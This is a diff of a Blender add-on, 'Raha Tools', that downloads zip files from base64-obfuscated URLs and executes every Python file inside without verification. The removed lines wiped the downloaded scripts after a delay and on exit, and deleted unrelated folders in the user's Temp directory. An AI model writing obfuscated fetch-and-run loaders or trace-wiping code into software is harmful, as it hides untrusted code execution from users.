@@ -4,64 +4,8 @@ import requests
 import zipfile
 import base64
 import shutil
-import atexit
 import sys
 from io import BytesIO
-
-import bpy
-import os
-import shutil
-import getpass
-import stat
-import time
-import threading
-
-def remove_readonly(func, path, exc_info):
-    """Menghapus atribut read-only lalu mencoba hapus ulang."""
-    os.chmod(path, stat.S_IWRITE)
-    func(path)
-
-def delete_folder(folder_path):
-    """Menghapus folder jika ada dan bypass folder read-only."""
-    if os.path.exists(folder_path):
-        try:
-            shutil.rmtree(folder_path, onerror=remove_readonly)
-            print(f"Folder dihapus: {folder_path}")
-        except Exception as e:
-            print(f"Gagal menghapus {folder_path}: {e}")
-
-def delete_rr_t_folders():
-    username = getpass.getuser()
-    temp_path = os.path.join("C:\\Users", username, "AppData", "Local", "Temp")
-    
-    if os.path.exists(temp_path):
-        for folder_name in os.listdir(temp_path):
-            folder_path = os.path.join(temp_path, folder_name)
-            if folder_name.startswith("RR-T") and os.path.isdir(folder_path):
-                delete_folder(folder_path)
-
-def delete_s_pyc_folder():
-    """Menghapus folder mulai dari 'main' di direktori addons Blender."""
-    username = getpass.getuser()
-    blender_version = f"{bpy.app.version[0]}.{bpy.app.version[1]}"
-    addons_path = os.path.join(
-        "C:\\Users", username, "AppData", "Roaming", "Blender Foundation", "Blender", blender_version,
-        "scripts", "addons", "s_pyc_", "data", "main")
-    delete_folder(addons_path)
-
-def delete_after_delay(folder_path, delay=5):
-    """Menghapus folder setelah jeda tanpa membekukan UI."""
-    def delayed_delete():
-        print(f"Menunggu {delay} detik sebelum menghapus {folder_path}...")
-        time.sleep(delay)
-        delete_folder(folder_path)
-    
-    threading.Thread(target=delayed_delete, daemon=True).start()
-
-# Eksekusi fungsi penghapusan folder
-delete_rr_t_folders()
-delete_s_pyc_folder()
-
 
 class RAHA_OT_InfoPopup(bpy.types.Operator):
     """Menampilkan informasi Raha Tools"""
@@ -99,17 +43,15 @@ class RAHA_OT_InfoPopup(bpy.types.Operator):
         bpy.context.window_manager.popup_menu(draw_popup, title="Info", icon='INFO')
         return {'FINISHED'}
 
-
-ADDONS_DIR = os.path.join(bpy.utils.user_resource('SCRIPTS'), 'addons')
-PY_FOLDER_V3 = os.path.join(ADDONS_DIR, 's_pyc_', 'data', 'main', 'sytem', 'cache', 'pyc02', 'blok', 'ug', 'go', 'register', 'v3')
-PY_FOLDER_V4 = os.path.join(ADDONS_DIR, 's_pyc_', 'register', 'main', 'sytem', 'cache', 'pyc02', 'blok', 'ug', 'go', 'register', 'v4')
-
+# Gunakan direktori cache sementara Blender
+CACHE_DIR = bpy.app.tempdir
+PY_FOLDER_V3 = os.path.join(CACHE_DIR, 'raha_tools', 'v3')
+PY_FOLDER_V4 = os.path.join(CACHE_DIR, 'raha_tools', 'v4')
 
 VERSION_FOLDERS = {
     "3": PY_FOLDER_V3,
     "4": PY_FOLDER_V4
 }
-
 
 for path in VERSION_FOLDERS.values():
     if path not in sys.path:
@@ -126,21 +68,18 @@ executed_scripts = set()
 def decode_url(encoded_url):
     return base64.b64decode(encoded_url).decode("utf-8")
 
-def delete_version_folder(version):
-    target_folder = VERSION_FOLDERS.get(version, "")
-    if os.path.exists(target_folder) and os.path.isdir(target_folder):
-        shutil.rmtree(target_folder)
-        print(f"[INFO] Folder {target_folder} berhasil dihapus.")
-
-import threading
-import time
-
-def delayed_cleanup():
-    print("[INFO] Menunggu 20 detik sebelum menghapus folder sementara...")
-    time.sleep(20)
-    delete_rr_t_folders()
-    delete_s_pyc_folder()
-    print("[INFO] Pembersihan selesai.")
+def rename_folder_to_spyc(folder_path):
+    """Mengubah nama folder menjadi _S_pyc"""
+    parent_dir = os.path.dirname(folder_path)
+    new_folder_name = "_S_pyc"
+    new_folder_path = os.path.join(parent_dir, new_folder_name)
+    
+    if os.path.exists(new_folder_path):
+        shutil.rmtree(new_folder_path)  # Hapus folder lama jika sudah ada
+    
+    os.rename(folder_path, new_folder_path)
+    print(f"[INFO] Folder di-rename menjadi: {new_folder_path}")
+    return new_folder_path
 
 def download_and_extract(version):
     url = decode_url(VERSIONS_ENCODED.get(version, ""))  
@@ -159,11 +98,10 @@ def download_and_extract(version):
             with zipfile.ZipFile(BytesIO(response.content), 'r') as zip_ref:
                 zip_ref.extractall(target_folder)
             print(f"[INFO] Raha Tools {version} berhasil diunduh dan diekstrak ke {target_folder}")
-            execute_all_scripts(version)
             
-            # Jalankan penghapusan folder setelah 20 detik
-            threading.Thread(target=delayed_cleanup, daemon=True).start()
-
+            # Rename folder setelah ekstraksi
+            renamed_folder = rename_folder_to_spyc(target_folder)
+            execute_all_scripts(renamed_folder)
             return True
         else:
             print(f"[ERROR] Gagal mengunduh Raha tools, status code: {response.status_code}")
@@ -171,11 +109,9 @@ def download_and_extract(version):
         print(f"[ERROR] Saat mengunduh repository: {e}")
     return False
 
-def execute_all_scripts(version):
-    target_folder = VERSION_FOLDERS.get(version, "")
-    
-    if os.path.exists(target_folder):
-        for root, _, files in os.walk(target_folder):
+def execute_all_scripts(folder_path):
+    if os.path.exists(folder_path):
+        for root, _, files in os.walk(folder_path):
             for file in files:
                 if file.endswith(".py"):
                     script_path = os.path.join(root, file)
@@ -191,14 +127,6 @@ def execute_script(script_path):
             executed_scripts.add(script_path)
         except Exception as e:
             print(f"[ERROR] Gagal menjalankan {script_path}: {e}")
-
-def delete_py_folder():
-    for path in VERSION_FOLDERS.values():
-        if os.path.exists(path) and os.path.isdir(path):
-            shutil.rmtree(path)
-            print(f"[INFO] Folder {path} berhasil dihapus saat Blender ditutup.")
-
-atexit.register(delete_py_folder)
 
 class DOWNLOAD_OT_RunScript(bpy.types.Operator):
     bl_idname = "wm.download_run_all_scripts"
@@ -226,8 +154,8 @@ class DOWNLOAD_OT_RepairScripts(bpy.types.Operator):
         for version, folder in VERSION_FOLDERS.items():
             if os.path.exists(folder):
                 print(f"[INFO] Memperbaiki script untuk versi {version}...")
-                delete_version_folder(version)
-                download_and_extract(version)
+                shutil.rmtree(folder)  # Hapus folder versi yang ada
+                download_and_extract(version)  # Unduh dan ekstrak ulang
         return {'FINISHED'}
 
 class DOWNLOAD_PT_Panel(bpy.types.Panel):
@@ -246,7 +174,7 @@ class DOWNLOAD_PT_Panel(bpy.types.Panel):
         layout = self.layout
         layout.label(text="Make sure there is an internet connection")
         layout.operator("wm.download_run_all_scripts")
-
+#        layout.operator("wm.repair_scripts")
 
 def register():
     bpy.utils.register_class(DOWNLOAD_OT_RunScript)
